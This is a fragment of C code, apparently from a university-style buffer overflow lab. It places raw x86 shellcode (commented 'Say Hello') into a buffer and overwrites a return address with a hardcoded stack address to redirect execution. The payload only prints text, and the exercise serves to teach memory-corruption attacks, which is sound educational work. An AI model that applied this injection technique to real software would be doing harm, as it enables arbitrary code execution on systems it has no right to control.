...
//const char shellcode[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd"\
       "\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe9\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f"; // Say Hello
...
int main(int atgc, char ** argc) {
	...
	/* own code */
	memcpy(&buffer[32], shellcode, sizeof(shellcode));
	long *addr = (long*)(&buffer[24]);
	...
	*addr = 0xbffff2ac + 32;
	...
	// /root/Desktop/Lab2-BufferOverflows/BOF
	//*addr = 0xbffff24c + 32;
